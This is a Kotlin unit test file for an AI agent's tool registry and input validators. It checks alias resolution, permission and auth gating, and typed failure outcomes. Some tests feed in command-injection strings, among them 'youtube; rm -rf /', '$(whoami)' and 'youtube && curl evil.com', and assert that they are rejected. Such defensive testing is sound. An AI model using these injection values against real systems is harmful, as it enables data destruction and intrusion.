package com.dot.agent.tools

import com.dot.agent.policy.ToolCategory
import com.google.common.truth.Truth.assertThat
import kotlinx.coroutines.test.runTest
import org.junit.Test
import java.util.UUID

class InputGuardsTest {

    @Test
    fun `blank title rejected`() {
        assertThat(InputGuards.title("  ")).isInstanceOf(ValidationResult.Invalid::class.java)
        assertThat(InputGuards.title(null)).isInstanceOf(ValidationResult.Invalid::class.java)
    }

    @Test
    fun `overlong title rejected`() {
        val long = "a".repeat(InputGuards.MAX_TITLE_LENGTH + 1)
        assertThat(InputGuards.title(long)).isInstanceOf(ValidationResult.Invalid::class.java)
    }

    @Test
    fun `normal title accepted`() {
        assertThat(InputGuards.title("submit report")).isEqualTo(ValidationResult.Valid)
    }

    @Test
    fun `known alias accepted`() {
        assertThat(InputGuards.packageRef("youtube")).isEqualTo(ValidationResult.Valid)
        assertThat(InputGuards.packageRef("com.google.android.youtube")).isEqualTo(ValidationResult.Valid)
    }

    @Test
    fun `unknown arbitrary string rejected from open_app`() {
        // Blocks injection-shaped / shell-ish payloads from reaching Intent resolution.
        assertThat(InputGuards.packageRef("youtube; rm -rf /")).isInstanceOf(ValidationResult.Invalid::class.java)
        assertThat(InputGuards.packageRef("$(whoami)")).isInstanceOf(ValidationResult.Invalid::class.java)
        assertThat(InputGuards.packageRef("a")).isInstanceOf(ValidationResult.Invalid::class.java)
        assertThat(InputGuards.packageRef("")).isInstanceOf(ValidationResult.Invalid::class.java)
    }

    @Test
    fun `overlong query rejected`() {
        val q = "x".repeat(InputGuards.MAX_QUERY_LENGTH + 1)
        assertThat(InputGuards.query(q)).isInstanceOf(ValidationResult.Invalid::class.java)
    }
}

class ToolRegistryTest {

    private fun registryWithOpenApp() = ToolRegistry(listOf(OpenAppTool()))

    @Test
    fun `unknown tool is rejected not executed`() = runTest {
        val reg = registryWithOpenApp()
        val out = reg.invoke("definitely_not_a_tool", emptyMap())
        assertThat(out).isInstanceOf(ToolRegistry.InvocationOutcome.Rejected::class.java)
    }

    @Test
    fun `open_app resolves alias to package`() = runTest {
        val reg = registryWithOpenApp()
        val out = reg.invoke("open_app", mapOf("packageOrAlias" to "youtube"))
        assertThat(out).isInstanceOf(ToolRegistry.InvocationOutcome.Success::class.java)
        assertThat((out as ToolRegistry.InvocationOutcome.Success).value)
            .isEqualTo("com.google.android.youtube")
    }

    @Test
    fun `malicious tool argument is rejected before execution`() = runTest {
        val reg = registryWithOpenApp()
        val out = reg.invoke("open_app", mapOf("packageOrAlias" to "youtube && curl evil.com"))
        assertThat(out).isInstanceOf(ToolRegistry.InvocationOutcome.Rejected::class.java)
        assertThat((out as ToolRegistry.InvocationOutcome.Rejected).errorCode).isEqualTo("invalid_input")
    }

    @Test
    fun `missing permission yields permission required not success`() = runTest {
        val reg = ToolRegistry(listOf(PermissionGatedProbeTool()))
        reg.permissionGranted = { false }
        val out = reg.invoke("probe_permission", emptyMap())
        assertThat(out).isInstanceOf(ToolRegistry.InvocationOutcome.PermissionRequired::class.java)
    }

    @Test
    fun `missing auth yields auth required not success`() = runTest {
        val reg = ToolRegistry(listOf(AuthGatedProbeTool()))
        reg.authenticated = { false }
        val out = reg.invoke("probe_auth", emptyMap())
        assertThat(out).isInstanceOf(ToolRegistry.InvocationOutcome.AuthRequired::class.java)
    }

    @Test
    fun `tool failure is typed not reported as success`() = runTest {
        val reg = ToolRegistry(listOf(AlwaysFailsTool()))
        val out = reg.invoke("always_fails", emptyMap())
        assertThat(out).isInstanceOf(ToolRegistry.InvocationOutcome.Failed::class.java)
    }

    @Test
    fun `registry contains only registered tools`() {
        val reg = ToolRegistry(listOf(OpenAppTool()))
        assertThat(reg.contains("open_app")).isTrue()
        assertThat(reg.contains("send_email")).isFalse()
    }
}

private class PermissionGatedProbeTool : DotTool<Map<String, String?>, String> {
    override val name = "probe_permission"
    override val description = "test"
    override val category = ToolCategory.EXTERNAL_READ
    override val riskLevel = com.dot.agent.policy.RiskLevel.LOW
    override val timeoutMs = 100L
    override val maxRetries = 0
    override val requiresPermission = true
    override val requiresAuth = false
    override val audited = false
    override fun validate(input: Map<String, String?>) = ValidationResult.Valid
    override suspend fun execute(input: Map<String, String?>) = "ok"
}

private class AuthGatedProbeTool : DotTool<Map<String, String?>, String> {
    override val name = "probe_auth"
    override val description = "test"
    override val category = ToolCategory.EXTERNAL_READ
    override val riskLevel = com.dot.agent.policy.RiskLevel.LOW
    override val timeoutMs = 100L
    override val maxRetries = 0
    override val requiresPermission = false
    override val requiresAuth = true
    override val audited = false
    override fun validate(input: Map<String, String?>) = ValidationResult.Valid
    override suspend fun execute(input: Map<String, String?>) = "ok"
}

private class AlwaysFailsTool : DotTool<Map<String, String?>, String> {
    override val name = "always_fails"
    override val description = "test"
    override val category = ToolCategory.LOCAL_READ
    override val riskLevel = com.dot.agent.policy.RiskLevel.LOW
    override val timeoutMs = 100L
    override val maxRetries = 1
    override val requiresPermission = false
    override val requiresAuth = false
    override val audited = false
    override fun validate(input: Map<String, String?>) = ValidationResult.Valid
    override suspend fun execute(input: Map<String, String?>): String = throw IllegalStateException("boom")
}
